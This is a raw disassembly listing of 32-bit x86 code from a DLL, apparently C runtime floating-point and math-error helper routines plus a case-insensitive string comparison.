1000b1f2:	8b 0b                	mov    (%ebx),%ecx
1000b1f4:	ff 15 5c d1 00 10    	call   *0x1000d15c
1000b1fa:	59                   	pop    %ecx
1000b1fb:	5a                   	pop    %edx
1000b1fc:	58                   	pop    %eax
1000b1fd:	ff 23                	jmp    *(%ebx)
1000b1ff:	e8 0f 01 00 00       	call   0x1000b313
1000b204:	d9 c9                	fxch   %st(1)
1000b206:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000b20d:	8d 49 00             	lea    0x0(%ecx),%ecx
1000b210:	dd d8                	fstp   %st(0)
1000b212:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000b219:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000b220:	c3                   	ret
1000b221:	e8 ed 00 00 00       	call   0x1000b313
1000b226:	eb e8                	jmp    0x1000b210
1000b228:	dd d8                	fstp   %st(0)
1000b22a:	dd d8                	fstp   %st(0)
1000b22c:	d9 ee                	fldz
1000b22e:	c3                   	ret
1000b22f:	90                   	nop
1000b230:	dd d8                	fstp   %st(0)
1000b232:	dd d8                	fstp   %st(0)
1000b234:	d9 ee                	fldz
1000b236:	84 ed                	test   %ch,%ch
1000b238:	74 02                	je     0x1000b23c
1000b23a:	d9 e0                	fchs
1000b23c:	c3                   	ret
1000b23d:	dd d8                	fstp   %st(0)
1000b23f:	90                   	nop
1000b240:	dd d8                	fstp   %st(0)
1000b242:	d9 e8                	fld1
1000b244:	c3                   	ret
1000b245:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000b24c:	8d 64 24 00          	lea    0x0(%esp),%esp
1000b250:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
1000b256:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
1000b25c:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
1000b263:	74 08                	je     0x1000b26d
1000b265:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
1000b26c:	c3                   	ret
1000b26d:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
1000b274:	dc 05 fe 11 01 10    	faddl  0x100111fe
1000b27a:	c3                   	ret
1000b27b:	eb 03                	jmp    0x1000b280
1000b27d:	cc                   	int3
1000b27e:	cc                   	int3
1000b27f:	cc                   	int3
1000b280:	d9 c9                	fxch   %st(1)
1000b282:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000b289:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000b290:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
1000b296:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
1000b29c:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
1000b2a3:	74 09                	je     0x1000b2ae
1000b2a5:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
1000b2ac:	eb 07                	jmp    0x1000b2b5
1000b2ae:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
1000b2b5:	de c1                	faddp  %st,%st(1)
1000b2b7:	c3                   	ret
1000b2b8:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000b2bf:	90                   	nop
1000b2c0:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
1000b2c6:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
1000b2cc:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
1000b2d3:	74 20                	je     0x1000b2f5
1000b2d5:	d9 c9                	fxch   %st(1)
1000b2d7:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
1000b2dd:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
1000b2e3:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
1000b2ea:	74 09                	je     0x1000b2f5
1000b2ec:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
1000b2f3:	eb 07                	jmp    0x1000b2fc
1000b2f5:	c6 85 70 ff ff ff 01 	movb   $0x1,-0x90(%ebp)
1000b2fc:	de c1                	faddp  %st,%st(1)
1000b2fe:	c3                   	ret
1000b2ff:	90                   	nop
1000b300:	dd d8                	fstp   %st(0)
1000b302:	dd d8                	fstp   %st(0)
1000b304:	db 2d e0 11 01 10    	fldt   0x100111e0
1000b30a:	80 bd 70 ff ff ff 00 	cmpb   $0x0,-0x90(%ebp)
1000b311:	7f 07                	jg     0x1000b31a
1000b313:	c6 85 70 ff ff ff 01 	movb   $0x1,-0x90(%ebp)
1000b31a:	0a c9                	or     %cl,%cl
1000b31c:	c3                   	ret
1000b31d:	8d 49 00             	lea    0x0(%ecx),%ecx
1000b320:	dd d8                	fstp   %st(0)
1000b322:	dd d8                	fstp   %st(0)
1000b324:	db 2d f4 11 01 10    	fldt   0x100111f4
1000b32a:	0a ed                	or     %ch,%ch
1000b32c:	74 02                	je     0x1000b330
1000b32e:	d9 e0                	fchs
1000b330:	0a c9                	or     %cl,%cl
1000b332:	74 08                	je     0x1000b33c
1000b334:	dd 05 06 12 01 10    	fldl   0x10011206
1000b33a:	de c9                	fmulp  %st,%st(1)
1000b33c:	c3                   	ret
1000b33d:	0a c9                	or     %cl,%cl
1000b33f:	74 02                	je     0x1000b343
1000b341:	d9 e0                	fchs
1000b343:	c3                   	ret
1000b344:	cc                   	int3
1000b345:	cc                   	int3
1000b346:	cc                   	int3
1000b347:	cc                   	int3
1000b348:	cc                   	int3
1000b349:	cc                   	int3
1000b34a:	cc                   	int3
1000b34b:	cc                   	int3
1000b34c:	cc                   	int3
1000b34d:	cc                   	int3
1000b34e:	cc                   	int3
1000b34f:	cc                   	int3
1000b350:	d9 c0                	fld    %st(0)
1000b352:	d9 fc                	frndint
1000b354:	dc e1                	fsub   %st,%st(1)
1000b356:	d9 c9                	fxch   %st(1)
1000b358:	d9 e0                	fchs
1000b35a:	d9 f0                	f2xm1
1000b35c:	d9 e8                	fld1
1000b35e:	de c1                	faddp  %st,%st(1)
1000b360:	d9 fd                	fscale
1000b362:	dd d9                	fstp   %st(1)
1000b364:	c3                   	ret
1000b365:	8b 54 24 04          	mov    0x4(%esp),%edx
1000b369:	81 e2 00 03 00 00    	and    $0x300,%edx
1000b36f:	83 ca 7f             	or     $0x7f,%edx
1000b372:	66 89 54 24 06       	mov    %dx,0x6(%esp)
1000b377:	d9 6c 24 06          	fldcw  0x6(%esp)
1000b37b:	c3                   	ret
1000b37c:	a9 00 00 08 00       	test   $0x80000,%eax
1000b381:	74 06                	je     0x1000b389
1000b383:	b8 00 00 00 00       	mov    $0x0,%eax
1000b388:	c3                   	ret
1000b389:	dc 05 20 12 01 10    	faddl  0x10011220
1000b38f:	b8 00 00 00 00       	mov    $0x0,%eax
1000b394:	c3                   	ret
1000b395:	8b 42 04             	mov    0x4(%edx),%eax
1000b398:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
1000b39d:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
1000b3a2:	74 03                	je     0x1000b3a7
1000b3a4:	dd 02                	fldl   (%edx)
1000b3a6:	c3                   	ret
1000b3a7:	8b 42 04             	mov    0x4(%edx),%eax
1000b3aa:	83 ec 0a             	sub    $0xa,%esp
1000b3ad:	0d 00 00 ff 7f       	or     $0x7fff0000,%eax
1000b3b2:	89 44 24 06          	mov    %eax,0x6(%esp)
1000b3b6:	8b 42 04             	mov    0x4(%edx),%eax
1000b3b9:	8b 0a                	mov    (%edx),%ecx
1000b3bb:	0f a4 c8 0b          	shld   $0xb,%ecx,%eax
1000b3bf:	c1 e1 0b             	shl    $0xb,%ecx
1000b3c2:	89 44 24 04          	mov    %eax,0x4(%esp)
1000b3c6:	89 0c 24             	mov    %ecx,(%esp)
1000b3c9:	db 2c 24             	fldt   (%esp)
1000b3cc:	83 c4 0a             	add    $0xa,%esp
1000b3cf:	a9 00 00 00 00       	test   $0x0,%eax
1000b3d4:	8b 42 04             	mov    0x4(%edx),%eax
1000b3d7:	c3                   	ret
1000b3d8:	8b 44 24 08          	mov    0x8(%esp),%eax
1000b3dc:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
1000b3e1:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
1000b3e6:	74 01                	je     0x1000b3e9
1000b3e8:	c3                   	ret
1000b3e9:	8b 44 24 08          	mov    0x8(%esp),%eax
1000b3ed:	c3                   	ret
1000b3ee:	66 81 3c 24 7f 02    	cmpw   $0x27f,(%esp)
1000b3f4:	74 03                	je     0x1000b3f9
1000b3f6:	d9 2c 24             	fldcw  (%esp)
1000b3f9:	5a                   	pop    %edx
1000b3fa:	c3                   	ret
1000b3fb:	66 8b 04 24          	mov    (%esp),%ax
1000b3ff:	66 3d 7f 02          	cmp    $0x27f,%ax
1000b403:	74 1e                	je     0x1000b423
1000b405:	66 83 e0 20          	and    $0x20,%ax
1000b409:	74 15                	je     0x1000b420
1000b40b:	9b df e0             	fstsw  %ax
1000b40e:	66 83 e0 20          	and    $0x20,%ax
1000b412:	74 0c                	je     0x1000b420
1000b414:	b8 08 00 00 00       	mov    $0x8,%eax
1000b419:	e8 d9 00 00 00       	call   0x1000b4f7
1000b41e:	5a                   	pop    %edx
1000b41f:	c3                   	ret
1000b420:	d9 2c 24             	fldcw  (%esp)
1000b423:	5a                   	pop    %edx
1000b424:	c3                   	ret
1000b425:	83 ec 08             	sub    $0x8,%esp
1000b428:	dd 14 24             	fstl   (%esp)
1000b42b:	8b 44 24 04          	mov    0x4(%esp),%eax
1000b42f:	83 c4 08             	add    $0x8,%esp
1000b432:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
1000b437:	eb 14                	jmp    0x1000b44d
1000b439:	83 ec 08             	sub    $0x8,%esp
1000b43c:	dd 14 24             	fstl   (%esp)
1000b43f:	8b 44 24 04          	mov    0x4(%esp),%eax
1000b443:	83 c4 08             	add    $0x8,%esp
1000b446:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
1000b44b:	74 3d                	je     0x1000b48a
1000b44d:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
1000b452:	74 5f                	je     0x1000b4b3
1000b454:	66 8b 04 24          	mov    (%esp),%ax
1000b458:	66 3d 7f 02          	cmp    $0x27f,%ax
1000b45c:	74 2a                	je     0x1000b488
1000b45e:	66 83 e0 20          	and    $0x20,%ax
1000b462:	75 21                	jne    0x1000b485
1000b464:	9b df e0             	fstsw  %ax
1000b467:	66 83 e0 20          	and    $0x20,%ax
1000b46b:	74 18                	je     0x1000b485
1000b46d:	b8 08 00 00 00       	mov    $0x8,%eax
1000b472:	83 fa 1d             	cmp    $0x1d,%edx
1000b475:	74 07                	je     0x1000b47e
1000b477:	e8 7b 00 00 00       	call   0x1000b4f7
1000b47c:	5a                   	pop    %edx
1000b47d:	c3                   	ret
1000b47e:	e8 5d 00 00 00       	call   0x1000b4e0
1000b483:	5a                   	pop    %edx
1000b484:	c3                   	ret
1000b485:	d9 2c 24             	fldcw  (%esp)
1000b488:	5a                   	pop    %edx
1000b489:	c3                   	ret
1000b48a:	dd 05 4c 12 01 10    	fldl   0x1001124c
1000b490:	d9 c9                	fxch   %st(1)
1000b492:	d9 fd                	fscale
1000b494:	dd d9                	fstp   %st(1)
1000b496:	d9 c0                	fld    %st(0)
1000b498:	d9 e1                	fabs
1000b49a:	dc 1d 3c 12 01 10    	fcompl 0x1001123c
1000b4a0:	9b df e0             	fstsw  %ax
1000b4a3:	9e                   	sahf
1000b4a4:	b8 04 00 00 00       	mov    $0x4,%eax
1000b4a9:	73 c7                	jae    0x1000b472
1000b4ab:	dc 0d 5c 12 01 10    	fmull  0x1001125c
1000b4b1:	eb bf                	jmp    0x1000b472
1000b4b3:	dd 05 44 12 01 10    	fldl   0x10011244
1000b4b9:	d9 c9                	fxch   %st(1)
1000b4bb:	d9 fd                	fscale
1000b4bd:	dd d9                	fstp   %st(1)
1000b4bf:	d9 c0                	fld    %st(0)
1000b4c1:	d9 e1                	fabs
1000b4c3:	dc 1d 34 12 01 10    	fcompl 0x10011234
1000b4c9:	9b df e0             	fstsw  %ax
1000b4cc:	9e                   	sahf
1000b4cd:	b8 03 00 00 00       	mov    $0x3,%eax
1000b4d2:	76 9e                	jbe    0x1000b472
1000b4d4:	dc 0d 54 12 01 10    	fmull  0x10011254
1000b4da:	eb 96                	jmp    0x1000b472
1000b4dc:	cc                   	int3
1000b4dd:	cc                   	int3
1000b4de:	cc                   	int3
1000b4df:	cc                   	int3
1000b4e0:	55                   	push   %ebp
1000b4e1:	8b ec                	mov    %esp,%ebp
1000b4e3:	83 c4 e0             	add    $0xffffffe0,%esp
1000b4e6:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000b4e9:	8b 45 18             	mov    0x18(%ebp),%eax
1000b4ec:	89 45 f0             	mov    %eax,-0x10(%ebp)
1000b4ef:	8b 45 1c             	mov    0x1c(%ebp),%eax
1000b4f2:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000b4f5:	eb 09                	jmp    0x1000b500
1000b4f7:	55                   	push   %ebp
1000b4f8:	8b ec                	mov    %esp,%ebp
1000b4fa:	83 c4 e0             	add    $0xffffffe0,%esp
1000b4fd:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000b500:	dd 5d f8             	fstpl  -0x8(%ebp)
1000b503:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
1000b506:	8b 45 10             	mov    0x10(%ebp),%eax
1000b509:	8b 4d 14             	mov    0x14(%ebp),%ecx
1000b50c:	89 45 e8             	mov    %eax,-0x18(%ebp)
1000b50f:	89 4d ec             	mov    %ecx,-0x14(%ebp)
1000b512:	8d 45 08             	lea    0x8(%ebp),%eax
1000b515:	8d 4d e0             	lea    -0x20(%ebp),%ecx
1000b518:	50                   	push   %eax
1000b519:	51                   	push   %ecx
1000b51a:	52                   	push   %edx
1000b51b:	e8 58 05 00 00       	call   0x1000ba78
1000b520:	83 c4 0c             	add    $0xc,%esp
1000b523:	dd 45 f8             	fldl   -0x8(%ebp)
1000b526:	66 81 7d 08 7f 02    	cmpw   $0x27f,0x8(%ebp)
1000b52c:	74 03                	je     0x1000b531
1000b52e:	d9 6d 08             	fldcw  0x8(%ebp)
1000b531:	c9                   	leave
1000b532:	c3                   	ret
1000b533:	8b ff                	mov    %edi,%edi
1000b535:	55                   	push   %ebp
1000b536:	8b ec                	mov    %esp,%ebp
1000b538:	83 ec 20             	sub    $0x20,%esp
1000b53b:	83 3d 14 47 01 10 00 	cmpl   $0x0,0x10014714
1000b542:	56                   	push   %esi
1000b543:	57                   	push   %edi
1000b544:	74 10                	je     0x1000b556
1000b546:	ff 35 88 47 01 10    	push   0x10014788
1000b54c:	ff 15 ac d0 00 10    	call   *0x1000d0ac
1000b552:	8b f8                	mov    %eax,%edi
1000b554:	eb 05                	jmp    0x1000b55b
1000b556:	bf 49 82 00 10       	mov    $0x10008249,%edi
1000b55b:	8b 45 14             	mov    0x14(%ebp),%eax
1000b55e:	83 f8 1a             	cmp    $0x1a,%eax
1000b561:	0f 8f de 00 00 00    	jg     0x1000b645
1000b567:	0f 84 cc 00 00 00    	je     0x1000b639
1000b56d:	83 f8 0e             	cmp    $0xe,%eax
1000b570:	7f 65                	jg     0x1000b5d7
1000b572:	74 50                	je     0x1000b5c4
1000b574:	6a 02                	push   $0x2
1000b576:	59                   	pop    %ecx
1000b577:	2b c1                	sub    %ecx,%eax
1000b579:	74 3a                	je     0x1000b5b5
1000b57b:	83 e8 01             	sub    $0x1,%eax
1000b57e:	74 29                	je     0x1000b5a9
1000b580:	83 e8 05             	sub    $0x5,%eax
1000b583:	74 15                	je     0x1000b59a
1000b585:	83 e8 01             	sub    $0x1,%eax
1000b588:	0f 85 95 01 00 00    	jne    0x1000b723
1000b58e:	c7 45 e4 68 12 01 10 	movl   $0x10011268,-0x1c(%ebp)
1000b595:	e9 01 01 00 00       	jmp    0x1000b69b
1000b59a:	89 4d e0             	mov    %ecx,-0x20(%ebp)
1000b59d:	c7 45 e4 68 12 01 10 	movl   $0x10011268,-0x1c(%ebp)
1000b5a4:	e9 3f 01 00 00       	jmp    0x1000b6e8
1000b5a9:	c7 45 e4 64 12 01 10 	movl   $0x10011264,-0x1c(%ebp)
1000b5b0:	e9 e6 00 00 00       	jmp    0x1000b69b
1000b5b5:	89 4d e0             	mov    %ecx,-0x20(%ebp)
1000b5b8:	c7 45 e4 64 12 01 10 	movl   $0x10011264,-0x1c(%ebp)
1000b5bf:	e9 24 01 00 00       	jmp    0x1000b6e8
1000b5c4:	c7 45 e0 03 00 00 00 	movl   $0x3,-0x20(%ebp)
1000b5cb:	c7 45 e4 70 12 01 10 	movl   $0x10011270,-0x1c(%ebp)
1000b5d2:	e9 11 01 00 00       	jmp    0x1000b6e8
1000b5d7:	83 e8 0f             	sub    $0xf,%eax
1000b5da:	74 54                	je     0x1000b630
1000b5dc:	83 e8 09             	sub    $0x9,%eax
1000b5df:	74 43                	je     0x1000b624
1000b5e1:	83 e8 01             	sub    $0x1,%eax
1000b5e4:	0f 85 39 01 00 00    	jne    0x1000b723
1000b5ea:	c7 45 e4 74 12 01 10 	movl   $0x10011274,-0x1c(%ebp)
1000b5f1:	8b 45 08             	mov    0x8(%ebp),%eax
1000b5f4:	8b cf                	mov    %edi,%ecx
1000b5f6:	8b 75 10             	mov    0x10(%ebp),%esi
1000b5f9:	c7 45 e0 04 00 00 00 	movl   $0x4,-0x20(%ebp)
1000b600:	dd 00                	fldl   (%eax)
1000b602:	8b 45 0c             	mov    0xc(%ebp),%eax
1000b605:	dd 5d e8             	fstpl  -0x18(%ebp)
1000b608:	dd 00                	fldl   (%eax)
1000b60a:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000b60d:	dd 5d f0             	fstpl  -0x10(%ebp)
1000b610:	dd 06                	fldl   (%esi)
1000b612:	50                   	push   %eax
1000b613:	dd 5d f8             	fstpl  -0x8(%ebp)
1000b616:	ff 15 5c d1 00 10    	call   *0x1000d15c
1000b61c:	ff d7                	call   *%edi
1000b61e:	59                   	pop    %ecx
1000b61f:	e9 fa 00 00 00       	jmp    0x1000b71e
1000b624:	c7 45 e0 03 00 00 00 	movl   $0x3,-0x20(%ebp)
1000b62b:	e9 b1 00 00 00       	jmp    0x1000b6e1
1000b630:	c7 45 e4 70 12 01 10 	movl   $0x10011270,-0x1c(%ebp)
1000b637:	eb b8                	jmp    0x1000b5f1
1000b639:	d9 e8                	fld1
1000b63b:	8b 45 10             	mov    0x10(%ebp),%eax
1000b63e:	dd 18                	fstpl  (%eax)
1000b640:	e9 de 00 00 00       	jmp    0x1000b723
1000b645:	83 e8 1b             	sub    $0x1b,%eax
1000b648:	0f 84 8c 00 00 00    	je     0x1000b6da
1000b64e:	83 e8 01             	sub    $0x1,%eax
1000b651:	74 41                	je     0x1000b694
1000b653:	83 e8 15             	sub    $0x15,%eax
1000b656:	74 33                	je     0x1000b68b
1000b658:	83 e8 09             	sub    $0x9,%eax
1000b65b:	74 25                	je     0x1000b682
1000b65d:	83 e8 03             	sub    $0x3,%eax
1000b660:	74 17                	je     0x1000b679
1000b662:	2d ab 03 00 00       	sub    $0x3ab,%eax
1000b667:	74 09                	je     0x1000b672
1000b669:	83 e8 01             	sub    $0x1,%eax
1000b66c:	0f 85 b1 00 00 00    	jne    0x1000b723
1000b672:	8b 45 08             	mov    0x8(%ebp),%eax
1000b675:	dd 00                	fldl   (%eax)
1000b677:	eb c2                	jmp    0x1000b63b
1000b679:	c7 45 e4 78 12 01 10 	movl   $0x10011278,-0x1c(%ebp)
1000b680:	eb 19                	jmp    0x1000b69b
1000b682:	c7 45 e4 80 12 01 10 	movl   $0x10011280,-0x1c(%ebp)
1000b689:	eb 10                	jmp    0x1000b69b
1000b68b:	c7 45 e4 88 12 01 10 	movl   $0x10011288,-0x1c(%ebp)
1000b692:	eb 07                	jmp    0x1000b69b
1000b694:	c7 45 e4 74 12 01 10 	movl   $0x10011274,-0x1c(%ebp)
1000b69b:	8b 45 08             	mov    0x8(%ebp),%eax
1000b69e:	8b cf                	mov    %edi,%ecx
1000b6a0:	8b 75 10             	mov    0x10(%ebp),%esi
1000b6a3:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
1000b6aa:	dd 00                	fldl   (%eax)
1000b6ac:	8b 45 0c             	mov    0xc(%ebp),%eax
1000b6af:	dd 5d e8             	fstpl  -0x18(%ebp)
1000b6b2:	dd 00                	fldl   (%eax)
1000b6b4:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000b6b7:	dd 5d f0             	fstpl  -0x10(%ebp)
1000b6ba:	dd 06                	fldl   (%esi)
1000b6bc:	50                   	push   %eax
1000b6bd:	dd 5d f8             	fstpl  -0x8(%ebp)
1000b6c0:	ff 15 5c d1 00 10    	call   *0x1000d15c
1000b6c6:	ff d7                	call   *%edi
1000b6c8:	59                   	pop    %ecx
1000b6c9:	85 c0                	test   %eax,%eax
1000b6cb:	75 51                	jne    0x1000b71e
1000b6cd:	e8 44 9f ff ff       	call   0x10005616
1000b6d2:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
1000b6d8:	eb 44                	jmp    0x1000b71e
1000b6da:	c7 45 e0 02 00 00 00 	movl   $0x2,-0x20(%ebp)
1000b6e1:	c7 45 e4 74 12 01 10 	movl   $0x10011274,-0x1c(%ebp)
1000b6e8:	8b 45 08             	mov    0x8(%ebp),%eax
1000b6eb:	8b cf                	mov    %edi,%ecx
1000b6ed:	8b 75 10             	mov    0x10(%ebp),%esi
1000b6f0:	dd 00                	fldl   (%eax)
1000b6f2:	8b 45 0c             	mov    0xc(%ebp),%eax
1000b6f5:	dd 5d e8             	fstpl  -0x18(%ebp)
1000b6f8:	dd 00                	fldl   (%eax)
1000b6fa:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000b6fd:	dd 5d f0             	fstpl  -0x10(%ebp)
1000b700:	dd 06                	fldl   (%esi)
1000b702:	50                   	push   %eax
1000b703:	dd 5d f8             	fstpl  -0x8(%ebp)
1000b706:	ff 15 5c d1 00 10    	call   *0x1000d15c
1000b70c:	ff d7                	call   *%edi
1000b70e:	59                   	pop    %ecx
1000b70f:	85 c0                	test   %eax,%eax
1000b711:	75 0b                	jne    0x1000b71e
1000b713:	e8 fe 9e ff ff       	call   0x10005616
1000b718:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
1000b71e:	dd 45 f8             	fldl   -0x8(%ebp)
1000b721:	dd 1e                	fstpl  (%esi)
1000b723:	5f                   	pop    %edi
1000b724:	5e                   	pop    %esi
1000b725:	c9                   	leave
1000b726:	c3                   	ret
1000b727:	8b ff                	mov    %edi,%edi
1000b729:	55                   	push   %ebp
1000b72a:	8b ec                	mov    %esp,%ebp
1000b72c:	51                   	push   %ecx
1000b72d:	51                   	push   %ecx
1000b72e:	53                   	push   %ebx
1000b72f:	56                   	push   %esi
1000b730:	be ff ff 00 00       	mov    $0xffff,%esi
1000b735:	56                   	push   %esi
1000b736:	68 3f 1b 00 00       	push   $0x1b3f
1000b73b:	e8 12 01 00 00       	call   0x1000b852
1000b740:	dd 45 08             	fldl   0x8(%ebp)
1000b743:	8b d8                	mov    %eax,%ebx
1000b745:	59                   	pop    %ecx
1000b746:	59                   	pop    %ecx
1000b747:	0f b7 4d 0e          	movzwl 0xe(%ebp),%ecx
1000b74b:	b8 f0 7f 00 00       	mov    $0x7ff0,%eax
1000b750:	23 c8                	and    %eax,%ecx
1000b752:	51                   	push   %ecx
1000b753:	51                   	push   %ecx
1000b754:	dd 1c 24             	fstpl  (%esp)
1000b757:	66 3b c8             	cmp    %ax,%cx
1000b75a:	75 3d                	jne    0x1000b799
1000b75c:	e8 09 0c 00 00       	call   0x1000c36a
1000b761:	48                   	dec    %eax
1000b762:	59                   	pop    %ecx
1000b763:	59                   	pop    %ecx
1000b764:	83 f8 02             	cmp    $0x2,%eax
1000b767:	77 0c                	ja     0x1000b775
1000b769:	56                   	push   %esi
1000b76a:	53                   	push   %ebx
1000b76b:	e8 e2 00 00 00       	call   0x1000b852
1000b770:	dd 45 08             	fldl   0x8(%ebp)
1000b773:	eb 61                	jmp    0x1000b7d6
1000b775:	dd 45 08             	fldl   0x8(%ebp)
1000b778:	dd 05 90 12 01 10    	fldl   0x10011290
1000b77e:	53                   	push   %ebx
1000b77f:	83 ec 10             	sub    $0x10,%esp
1000b782:	d8 c1                	fadd   %st(1),%st
1000b784:	dd 5c 24 08          	fstpl  0x8(%esp)
1000b788:	dd 1c 24             	fstpl  (%esp)
1000b78b:	6a 0c                	push   $0xc
1000b78d:	6a 08                	push   $0x8
1000b78f:	e8 36 04 00 00       	call   0x1000bbca
1000b794:	83 c4 1c             	add    $0x1c,%esp
1000b797:	eb 3f                	jmp    0x1000b7d8
1000b799:	e8 e4 03 00 00       	call   0x1000bb82
1000b79e:	dd 55 f8             	fstl   -0x8(%ebp)
1000b7a1:	dd 45 08             	fldl   0x8(%ebp)
1000b7a4:	83 c4 08             	add    $0x8,%esp
1000b7a7:	dd e1                	fucom  %st(1)
1000b7a9:	df e0                	fnstsw %ax
1000b7ab:	f6 c4 44             	test   $0x44,%ah
1000b7ae:	7b 18                	jnp    0x1000b7c8
1000b7b0:	f6 c3 20             	test   $0x20,%bl
1000b7b3:	75 13                	jne    0x1000b7c8
1000b7b5:	53                   	push   %ebx
1000b7b6:	83 ec 10             	sub    $0x10,%esp
1000b7b9:	d9 c9                	fxch   %st(1)
1000b7bb:	dd 5c 24 08          	fstpl  0x8(%esp)
1000b7bf:	dd 1c 24             	fstpl  (%esp)
1000b7c2:	6a 0c                	push   $0xc
1000b7c4:	6a 10                	push   $0x10
1000b7c6:	eb c7                	jmp    0x1000b78f
1000b7c8:	56                   	push   %esi
1000b7c9:	dd d9                	fstp   %st(1)
1000b7cb:	53                   	push   %ebx
1000b7cc:	dd d8                	fstp   %st(0)
1000b7ce:	e8 7f 00 00 00       	call   0x1000b852
1000b7d3:	dd 45 f8             	fldl   -0x8(%ebp)
1000b7d6:	59                   	pop    %ecx
1000b7d7:	59                   	pop    %ecx
1000b7d8:	5e                   	pop    %esi
1000b7d9:	5b                   	pop    %ebx
1000b7da:	c9                   	leave
1000b7db:	c3                   	ret
1000b7dc:	cc                   	int3
1000b7dd:	cc                   	int3
1000b7de:	cc                   	int3
1000b7df:	cc                   	int3
1000b7e0:	55                   	push   %ebp
1000b7e1:	8b ec                	mov    %esp,%ebp
1000b7e3:	57                   	push   %edi
1000b7e4:	56                   	push   %esi
1000b7e5:	53                   	push   %ebx
1000b7e6:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000b7e9:	0b c9                	or     %ecx,%ecx
1000b7eb:	74 4d                	je     0x1000b83a
1000b7ed:	8b 75 08             	mov    0x8(%ebp),%esi
1000b7f0:	8b 7d 0c             	mov    0xc(%ebp),%edi
1000b7f3:	b7 41                	mov    $0x41,%bh
1000b7f5:	b3 5a                	mov    $0x5a,%bl
1000b7f7:	b6 20                	mov    $0x20,%dh
1000b7f9:	8d 49 00             	lea    0x0(%ecx),%ecx
1000b7fc:	8a 26                	mov    (%esi),%ah
1000b7fe:	0a e4                	or     %ah,%ah
1000b800:	8a 07                	mov    (%edi),%al
1000b802:	74 27                	je     0x1000b82b
1000b804:	0a c0                	or     %al,%al
1000b806:	74 23                	je     0x1000b82b
1000b808:	83 c6 01             	add    $0x1,%esi
1000b80b:	83 c7 01             	add    $0x1,%edi
1000b80e:	3a e7                	cmp    %bh,%ah
1000b810:	72 06                	jb     0x1000b818
1000b812:	3a e3                	cmp    %bl,%ah
1000b814:	77 02                	ja     0x1000b818
1000b816:	02 e6                	add    %dh,%ah
1000b818:	3a c7                	cmp    %bh,%al
1000b81a:	72 06                	jb     0x1000b822
1000b81c:	3a c3                	cmp    %bl,%al
1000b81e:	77 02                	ja     0x1000b822
1000b820:	02 c6                	add    %dh,%al
1000b822:	3a e0                	cmp    %al,%ah
1000b824:	75 0b                	jne    0x1000b831
1000b826:	83 e9 01             	sub    $0x1,%ecx
1000b829:	75 d1                	jne    0x1000b7fc
1000b82b:	33 c9                	xor    %ecx,%ecx
1000b82d:	3a e0                	cmp    %al,%ah
1000b82f:	74 09                	je     0x1000b83a
1000b831:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
1000b836:	72 02                	jb     0x1000b83a
1000b838:	f7 d9                	neg    %ecx
1000b83a:	8b c1                	mov    %ecx,%eax
1000b83c:	5b                   	pop    %ebx
1000b83d:	5e                   	pop    %esi
1000b83e:	5f                   	pop    %edi
1000b83f:	c9                   	leave
1000b840:	c3                   	ret
1000b841:	8b ff                	mov    %edi,%edi
1000b843:	55                   	push   %ebp
1000b844:	8b ec                	mov    %esp,%ebp
1000b846:	51                   	push   %ecx
1000b847:	dd 7d fc             	fnstsw -0x4(%ebp)
1000b84a:	db e2                	fnclex
1000b84c:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
1000b850:	c9                   	leave
1000b851:	c3                   	ret
1000b852:	8b ff                	mov    %edi,%edi
1000b854:	55                   	push   %ebp
1000b855:	8b ec                	mov    %esp,%ebp
1000b857:	51                   	push   %ecx
1000b858:	51                   	push   %ecx
1000b859:	9b d9 7d fc          	fstcw  -0x4(%ebp)
1000b85d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000b860:	8b 45 08             	mov    0x8(%ebp),%eax
1000b863:	f7 d1                	not    %ecx
1000b865:	66 23 4d fc          	and    -0x4(%ebp),%cx
1000b869:	23 45 0c             	and    0xc(%ebp),%eax
1000b86c:	66 0b c8             	or     %ax,%cx
1000b86f:	66 89 4d f8          	mov    %cx,-0x8(%ebp)
1000b873:	d9 6d f8             	fldcw  -0x8(%ebp)
